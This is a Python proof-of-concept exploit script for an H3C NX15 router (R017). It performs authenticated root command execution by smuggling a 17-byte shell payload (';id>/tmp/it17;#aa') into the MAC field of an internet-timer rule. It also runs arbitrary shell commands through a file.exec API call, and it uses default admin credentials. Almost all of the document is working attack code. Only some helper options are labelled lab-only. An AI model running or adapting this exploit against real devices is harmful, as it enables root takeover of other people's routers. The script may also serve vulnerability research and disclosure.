#!/usr/bin/env python3
import argparse
import json
import sys
import time
from typing import Any

import requests


DEFAULT_PAYLOAD = ';id>/tmp/it17;#aa'  # exactly 17 bytes
DEFAULT_TIMERANGE = '00:00-23:59'
DEFAULT_WEEK = [1, 2, 3, 4, 5, 6, 7]


def log(msg: str) -> None:
    print(msg, flush=True)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(
        base.rstrip('/') + '/api/login/auth',
        json={'username': username, 'password': password},
        timeout=10,
    )
    r.raise_for_status()
    body = r.json()
    if body.get('code') != 0:
        raise RuntimeError(f'login failed: {body}')
    return body['data']['session']


def esps(base: str, session: str, obj: str, method: str, param: dict[str, Any], timeout: int = 30):
    headers = {'AUTHENTICATION': session, 'Content-Type': 'application/json'}
    payload = [{'id': 1, 'object': obj, 'method': method, 'param': param}]
    r = requests.post(base.rstrip('/') + '/api/esps', headers=headers, data=json.dumps(payload), timeout=timeout)
    r.raise_for_status()
    try:
        return r.json()
    except Exception:
        return r.text


def file_exec(base: str, session: str, shell_cmd: str, timeout: int = 40):
    return esps(
        base,
        session,
        'file',
        'exec',
        {
            'command': '/bin/sh',
            'params': ['-c', shell_cmd],
            'env': {},
        },
        timeout=timeout,
    )


def result_of(resp: Any) -> dict[str, Any]:
    if isinstance(resp, list) and resp and isinstance(resp[0], dict):
        return resp[0].get('result', {})
    if isinstance(resp, dict):
        return resp.get('result', {})
    return {}


def build_cleanup_cmd(marker_path: str = '/tmp/it17') -> str:
    return (
        f'rm -f {marker_path}; '
        'uci -q delete internet_timerange.internettimer_1; '
        'uci set internet_timerange.mainconfig.timerange_count=0; '
        'uci commit internet_timerange; '
        '/etc/init.d/timerange restart; '
        'sleep 1; '
        'uci show internet_timerange 2>/dev/null'
    )


def build_verify_cmd(marker_path: str = '/tmp/it17') -> str:
    return (
        f'ls -l {marker_path} 2>/dev/null; '
        'echo SEP1; '
        f'cat {marker_path} 2>/dev/null; '
        'echo SEP2; '
        'date; '
        'echo SEP3; '
        'uci show internet_timerange 2>/dev/null; '
        'echo SEP4; '
        'grep -n cmd: /var/log/timerange.log 2>/dev/null || true; '
        'echo SEP5; '
        'tail -n 80 /var/log/timerange.log 2>/dev/null'
    )


def main() -> int:
    ap = argparse.ArgumentParser(
        description='H3C NX15 R017 post-auth root RCE via esps.macfilter.internettimer.add -> timerange shell_input'
    )
    ap.add_argument('--base', default='http://192.168.8.1', help='router base URL')
    ap.add_argument('--username', default='admin', help='web admin username')
    ap.add_argument('--password', default='admin123', help='web admin password')
    ap.add_argument('--payload', default=DEFAULT_PAYLOAD, help='exactly 17-byte shell payload stored into mac')
    ap.add_argument('--status', default='enable', choices=['enable', 'disable'], help='internettimer status')
    ap.add_argument('--action', default='on', choices=['on', 'off'], help='internettimer action')
    ap.add_argument('--time-range', default=DEFAULT_TIMERANGE, help='timerange string, default 00:00-23:59')
    ap.add_argument('--week', default='1,2,3,4,5,6,7', help='comma-separated weekday list')
    ap.add_argument('--helper-file-exec-check', action='store_true', help='lab-only: use existing file.exec primitive to read marker/config/log after exploitation')
    ap.add_argument('--helper-set-time', default='', help='lab-only: if set, first use file.exec to run `date -s VALUE` before triggering, e.g. 2026.06.11-20:02:00')
    ap.add_argument('--cleanup', action='store_true', help='lab-only: use file.exec to remove the created internettimer rule after verification')
    args = ap.parse_args()

    if len(args.payload) != 17:
        log(f'[-] payload length must be exactly 17 bytes, got {len(args.payload)}')
        return 2

    try:
        week = [int(x.strip()) for x in args.week.split(',') if x.strip()]
    except ValueError:
        log('[-] invalid --week, expected comma-separated integers like 1,2,3,4,5,6,7')
        return 2

    log('[*] Step 1: login')
    session = login(args.base, args.username, args.password)
    log(f'[*] session = {session}')

    if args.helper_set_time:
        log(f'[*] Lab helper: setting router time via file.exec -> {args.helper_set_time}')
        resp = file_exec(args.base, session, f'date -s {args.helper_set_time}; date')
        print(json.dumps(resp, ensure_ascii=False, indent=2) if not isinstance(resp, str) else resp)

    log('[*] Step 2: trigger esps.macfilter.internettimer.add')
    resp = esps(
        args.base,
        session,
        'esps.macfilter.internettimer',
        'add',
        {
            'mac': args.payload,
            'status': args.status,
            'action': args.action,
            'timeRange': args.time_range,
            'week': week,
        },
        timeout=30,
    )
    print(json.dumps(resp, ensure_ascii=False, indent=2) if not isinstance(resp, str) else resp)

    result = result_of(resp)
    if result.get('code') not in (0, None):
        log('[-] exploit request did not return success')
        return 1

    log('[*] Step 3: exploit request accepted')
    log('[*] Notes:')
    log('    - The vulnerable branch is reached only when mac length == 17.')
    log('    - On fresh-reset devices, timerange may not execute immediately until system time is no longer 1970.')
    log('    - If NTP has synced or router time is valid, timerange restart/start should execute the payload as root.')

    if args.helper_file_exec_check:
        log('[*] Lab helper: sleeping 3 seconds before verification')
        time.sleep(3)
        verify = file_exec(args.base, session, build_verify_cmd())
        print(json.dumps(verify, ensure_ascii=False, indent=2) if not isinstance(verify, str) else verify)

    if args.cleanup:
        log('[*] Lab helper: cleaning created internettimer rule')
        cleanup = file_exec(args.base, session, build_cleanup_cmd())
        print(json.dumps(cleanup, ensure_ascii=False, indent=2) if not isinstance(cleanup, str) else cleanup)

    log('[+] DONE')
    return 0


if __name__ == '__main__':
    sys.exit(main())
